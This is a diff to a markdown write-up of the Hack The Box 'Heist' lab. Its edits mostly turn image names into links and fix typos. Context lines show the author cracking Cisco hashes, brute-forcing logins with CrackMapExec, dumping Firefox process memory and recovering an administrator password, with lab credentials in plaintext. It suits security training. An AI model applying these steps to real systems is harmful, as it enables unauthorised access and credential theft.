@@ -54,19 +54,21 @@ Looking at the site we find a Login portal for a support page:
 
 Clicking into the page source we see we have the ability to login as a guest at `/login.php?guest=true`
 
-htb_heist_login.png
+![htb_heist_login.png](../assets/heist_assets/htb_heist_login.png)
 
 Navigating here we are forwarded to `/issues.php` which has an exchange between admin and a user called Hazard, who has an attachment and states they need to be added as a user as well as mentioning issues with a Cisco router.
 
 Clicking on the attachment we find some interesting information:
 
-htb_heist_config.png
+![htb_heist_config.png](../assets/heist_assets/htb_heist_config.png)
 
-Lets crack these password hashes at: https://www.ifm.net.nz/cookbooks/passwordcracker.html
+Lets crack these Cisco password hashes at: https://www.ifm.net.nz/cookbooks/passwordcracker.html
 
-htb_heist_crack1.png
+### Foothold
 
-htb_heist_crack2.png
+![htb_heist_crack1.png](../assets/heist_assets/htb_heist_crack1.png)
+
+![htb_heist_crack2.png](../assets/heist_assets/htb_heist_crack2.png)
 
 We can use HashCat to crack the type 5 password hash:
 
@@ -103,13 +105,13 @@ Cool, looks like a new password, `stealth1agent`
 
 Lets add our known users to a file called users.txt and the cracked passwords to a file called passwords.txt. We can then use CrackMapExec to bruteforce:
 
-htb_heist_cme1.png
+![htb_heist_cme1.png](../assets/heist_assets/htb_heist_cme1.png)
 
 We've found valid credentials: `hazard"stealth1agent`
 
 Lets use these credentials in crackmapexec, this time with the `--rid-brute` flag to try to discover more users:
 
-htb_heist_rid.png
+![htb_heist_rid.png](../assets/heist_assets/htb_heist_rid.png)
 
 Lets add these newly discovered usernames to our user.txt file.
 
@@ -145,7 +147,7 @@ SupportDesk
 
 We can now grab the user.txt flag:
 
-htb_heist_user_flag.png
+![htb_heist_user_flag.png](../assets/heist_assets/htb_heist_user_flag.png)
 
 ### Privilege Escalation
 
@@ -163,11 +165,11 @@ Done:
 
 Loading WinPEAS onto the target we see there are some cached firefox credentials.
 
-htb_heist_wp2.png
+![htb_heist_wp2.png](../assets/heist_assets/htb_heist_wp2.png)
 
 And firefox.exe is running:
 
-htb_heist_wp.png
+![htb_heist_wp.png](../assets/heist_assets/htb_heist_wp.png)
 
 Lets use https://github.com/djhohnstein/SharpWeb/ to help with this.
 
@@ -213,7 +215,7 @@ Sysinternals - www.sysinternals.com
 [01:14:36] Dump count reached.
 ```
 
-With `-ma 6400` being the firs process id for firefox.
+With `-ma 6400` being the first process id for firefox.
 
 Cool, we now have a process dump for firefox:
 
@@ -236,7 +238,7 @@ Mode                LastWriteTime         Length Name
 We can now download the file locally to our attacking machine:
 
 ```
-*Evil-WinRM* PS C:\temp> download C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\firefox.exe_240724_011432.dmp /home/ryan/HTB/Heist/firefox.exe_240724_011432.dmp
+*Evil-WinRM* PS C:\temp> download C:\temp\firefox.exe_240724_011432.dmp /home/ryan/HTB/Heist/firefox.exe_240724_011432.dmp
 Info: Downloading C:\temp\firefox.exe_240724_011432.dmp to /home/ryan/HTB/Heist/firefox.exe_240724_011432.dmp
 
                                                              
@@ -252,7 +254,7 @@ Once back on our machine we can use `strings` and `grep` to look for anything in
 
 Cool, looks like we've found something:
 
-htb_heist_strings.png
+![htb_heist_strings.png](../assets/heist_assets/htb_heist_strings.png)
 
 `administrator: 4dD!5}x/re8]FBuZ`
 
@@ -277,7 +279,7 @@ supportdesk\administrator
 
 We can now grab the final flag:
 
-htb_heist_root_flag.png
+![htb_heist_root_flag.png](../assets/heist_assets/htb_heist_root_flag.png)
 
 Thanks for following along!
 
